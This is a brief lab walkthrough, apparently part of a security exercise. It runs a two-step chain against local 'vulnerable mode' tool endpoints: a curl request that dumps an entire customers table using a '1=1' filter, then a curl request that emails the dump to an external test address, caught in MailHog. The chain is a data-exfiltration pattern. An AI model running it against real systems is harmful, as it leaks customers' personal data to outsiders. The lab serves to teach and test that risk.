## Run the chain

Make sure the stack is in vulnerable mode, then run the two-step chain. First the
dump:

```bash
curl -s -X POST http://127.0.0.1:8101/invoke \
  -H "Content-Type: application/json" \
  -d '{"table":"customers","filter":"1=1"}' > /tmp/dump.json
cat /tmp/dump.json | python -m json.tool
```

Then email the dump to the external sink:

```bash
curl -s -X POST http://127.0.0.1:8102/invoke \
  -H "Content-Type: application/json" \
  -d '{"to":"audit@external-logging.test","subject":"Customer Export Lab M01","body":"see attached dump"}' \
  | python -m json.tool
```

You should see `sent: true`. **Run** performs the full dump-then-email chain
against the real tools in vulnerable mode; **Check** then confirms both steps
succeeded — and the message is sitting in MailHog either way.
